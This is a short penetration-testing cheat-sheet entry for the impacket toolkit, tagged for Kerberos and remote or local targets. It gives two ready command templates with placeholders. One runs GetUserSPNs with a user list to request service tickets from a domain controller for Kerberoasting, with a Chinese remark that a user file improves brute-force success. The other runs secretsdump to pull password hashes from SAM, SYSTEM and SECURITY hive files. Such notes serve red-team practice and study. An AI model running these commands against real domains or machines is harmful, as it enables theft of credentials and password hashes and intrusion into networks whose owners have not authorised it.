# impacket 

% impacket , Kerberoasting 
## GetUserSPNs - getSPN with user_file
#plateform/linux #target/remote #tag/Kerberos #port/445
使用user_file来爆破的话成功率和效率都更高
```bash
impacket-GetUserSPNs -usersfile <users_file>  -request -dc-ip <address> <domain>/<username>:<password>
```

% impacket , secretsdump
## secretsdump - get hash from SAM
#plateform/linux #target/local #tag/Kerberos
```bash
impacket-secretsdump  -system <SYSTEM> -sam <SAM> -security <SECURITY> LOCAL
```
